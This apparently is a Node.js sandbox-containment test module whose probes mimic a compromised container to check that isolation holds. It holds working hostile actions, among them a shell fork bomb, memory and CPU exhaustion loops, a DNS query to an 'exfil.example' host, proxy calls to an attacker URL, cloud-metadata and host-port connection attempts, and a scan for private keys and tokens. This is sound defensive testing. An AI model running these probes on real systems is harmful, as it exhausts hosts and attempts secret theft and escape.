// Containment probes. These simulate a fully compromised sandbox: code that ignores the agent
// entirely and tries to escape, exfiltrate, or exhaust the host. Every probe reports what it observed.
import fs from "node:fs";
import net from "node:net";
import dgram from "node:dgram";
import http from "node:http";
import crypto from "node:crypto";
import path from "node:path";
import { spawn } from "node:child_process";
import { Worker } from "node:worker_threads";
import { emit } from "./emit.mjs";

const sha = (v) => crypto.createHash("sha256").update(String(v)).digest("hex");

function tcp(host, port, ms = 3000) {
  return new Promise((resolve) => {
    const started = Date.now();
    const s = net.connect({ host, port });
    const done = (result) => {
      s.destroy();
      resolve({ ...result, ms: Date.now() - started });
    };
    s.setTimeout(ms, () => done({ connected: false, error: "timeout" }));
    s.on("connect", () => done({ connected: true }));
    s.on("error", (e) => done({ connected: false, error: e.code || e.message }));
  });
}

function udpDns(host, ms = 2500) {
  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4");
    // Minimal DNS query for exfil.example A record.
    const q = Buffer.from("abcd01000001000000000000056578666e6c076578616d706c650000010001", "hex");
    const t = setTimeout(() => {
      sock.close();
      resolve({ answered: false, error: "timeout" });
    }, ms);
    sock.on("message", () => {
      clearTimeout(t);
      sock.close();
      resolve({ answered: true });
    });
    sock.on("error", (e) => {
      clearTimeout(t);
      sock.close();
      resolve({ answered: false, error: e.code || e.message });
    });
    sock.send(q, 53, host);
  });
}

function viaProxy(proxyUrl, target, ms = 6000) {
  return new Promise((resolve) => {
    const p = new URL(proxyUrl);
    const t = new URL(target);
    if (t.protocol === "https:") {
      const req = http.request({ host: p.hostname, port: p.port, method: "CONNECT", path: `${t.hostname}:${t.port || 443}`, timeout: ms });
      req.on("connect", (res, socket) => {
        socket.destroy();
        resolve({ status: res.statusCode });
      });
      req.on("timeout", () => {
        req.destroy();
        resolve({ status: null, error: "timeout" });
      });
      req.on("error", (e) => resolve({ status: null, error: e.code || e.message }));
      req.end();
      return;
    }
    const req = http.request({ host: p.hostname, port: p.port, method: "GET", path: target, headers: { host: t.host }, timeout: ms }, (res) => {
      res.resume();
      resolve({ status: res.statusCode, blocked: res.headers["x-blast-door"] === "egress-blocked" });
    });
    req.on("timeout", () => {
      req.destroy();
      resolve({ status: null, error: "timeout" });
    });
    req.on("error", (e) => resolve({ status: null, error: e.code || e.message }));
    req.end();
  });
}

async function dnsLookup(name) {
  const dns = await import("node:dns/promises");
  try {
    const r = await Promise.race([dns.lookup(name), new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 4000))]);
    return { resolved: true, address: r.address };
  } catch (e) {
    return { resolved: false, error: e.code || e.message };
  }
}

// Split literals so this file does not match its own scan.
const SECRETY = new RegExp(
  ["VUL" + "TR", "BLASTDOOR_VM_" + "SSH", "INFERENCE_" + "API", "BEGIN [A-Z ]*PRIV" + "ATE KEY", "Bearer [A-Za-z0-9]{16,}"].join("|")
);

function scanFs(roots, limitFiles = 4000) {
  const hits = [];
  let files = 0;
  const walk = (dir, depth) => {
    if (depth > 6 || files > limitFiles) return;
    let entries = [];
    try {
      entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const e of entries) {
      const p = path.join(dir, e.name);
      if (p.startsWith("/proc") || p.startsWith("/sys") || p.startsWith("/opt/runner/node_modules") || p.startsWith("/ms-playwright") || p === "/work/node_modules") continue;
      if (e.isDirectory()) walk(p, depth + 1);
      else if (e.isFile()) {
        files++;
        try {
          const st = fs.statSync(p);
          if (st.size > 512 * 1024) continue;
          const txt = fs.readFileSync(p, "utf8");
          if (SECRETY.test(txt)) hits.push(p);
        } catch {}
      }
    }
  };
  for (const r of roots) walk(r, 0);
  return { filesScanned: files, hits };
}

const probes = {
  async env(task) {
    const entries = Object.entries(process.env).map(([k, v]) => ({ name: k, sha256: sha(v), length: String(v).length }));
    const fsScan = scanFs(["/work", "/tmp", "/home", "/etc", "/opt", "/root", "/run"]);
    let dockerSock = false;
    try {
      fs.statSync("/var/run/docker.sock");
      dockerSock = true;
    } catch {}
    let proc1 = "";
    try {
      proc1 = fs.readFileSync("/proc/1/cmdline", "utf8").replace(/\0/g, " ").trim();
    } catch {}
    const status = fs.readFileSync("/proc/self/status", "utf8");
    const capEff = (status.match(/CapEff:\s*(\w+)/) || [])[1];
    const noNewPrivs = (status.match(/NoNewPrivs:\s*(\d)/) || [])[1];
    const seccomp = (status.match(/Seccomp:\s*(\d)/) || [])[1];
    let rootWritable = true;
    try {
      fs.writeFileSync("/blastdoor-write-test", "x");
    } catch {
      rootWritable = false;
    }
    return { env: entries, fsScan, dockerSock, uid: process.getuid(), proc1, capEff, noNewPrivs, seccomp, rootWritable };
  },

  async net(task) {
    const gw = task.gateway;
    const results = {};
    results.direct_internet_tcp = await tcp("1.1.1.1", 443);
    results.metadata_service_tcp = await tcp("169.254.169.254", 80);
    results.host_ssh_tcp = await tcp(gw, 22);
    results.host_app_tcp = await tcp(gw, 3000);
    results.udp_dns_exfil = await udpDns("8.8.8.8");
    results.dns_resolution = await dnsLookup(new URL(task.attackerUrl).hostname);
    results.proxy_attacker = await viaProxy(task.proxy, task.attackerUrl + "collect?probe=exfil");
    results.proxy_metadata = await viaProxy(task.proxy, "http://169.254.169.254/v1.json");
    results.proxy_https_offlist = await viaProxy(task.proxy, "https://example.com/");
    results.proxy_allowed_target = await viaProxy(task.proxy, task.target);
    return results;
  },

  async forkbomb(task) {
    emit("log", { level: "info", msg: "starting shell fork bomb" });
    const child = spawn("/bin/sh", ["-c", "bomb() { bomb | bomb & }; bomb; sleep 3600"], { stdio: "ignore", detached: false });
    let spawnErrors = 0;
    const tryFork = () => {
      try {
        const c = spawn("/bin/true", [], { stdio: "ignore" });
        c.on("error", () => spawnErrors++);
      } catch {
        spawnErrors++;
      }
    };
    const t0 = Date.now();
    while (Date.now() - t0 < (task.holdMs || 8000)) {
      await new Promise((r) => setTimeout(r, 500));
      tryFork();
      emit("progress", { probe: "forkbomb", elapsedMs: Date.now() - t0, runnerSpawnErrors: spawnErrors });
    }
    // Keep the bomb alive; the orchestrator's wall clock is what ends this container.
    emit("log", { level: "info", msg: "fork bomb still running, waiting for the wall clock" });
    await new Promise(() => {});
    return { child: child.pid };
  },

  async memory(task) {
    const chunks = [];
    let mb = 0;
    emit("log", { level: "info", msg: "allocating memory in 32 MB chunks until the cgroup stops us" });
    for (;;) {
      const b = Buffer.alloc(32 * 1024 * 1024, 1);
      chunks.push(b);
      mb += 32;
      if (mb % 128 === 0) emit("progress", { probe: "memory", allocatedMb: mb });
      await new Promise((r) => setImmediate(r));
    }
  },

  async cpu(task) {
    const n = 4;
    const ms = task.holdMs || 6000;
    const code = `const end = Date.now() + ${ms}; let x = 0; while (Date.now() < end) { x = (x * 31 + 7) % 1000003; }`;
    const started = Date.now();
    await Promise.all(Array.from({ length: n }, () => new Promise((r) => new Worker(code, { eval: true }).on("exit", r))));
    return { threads: n, wallMs: Date.now() - started };
  },
};

export async function runProbe(task) {
  const fn = probes[task.probe];
  if (!fn) throw new Error(`unknown probe ${task.probe}`);
  const result = await fn(task);
  fs.writeFileSync(`/work/out/probe-${task.probe}.json`, JSON.stringify(result, null, 2));
  emit("probe", { probe: task.probe, result });
  emit("done", { mode: "probe", probe: task.probe });
}
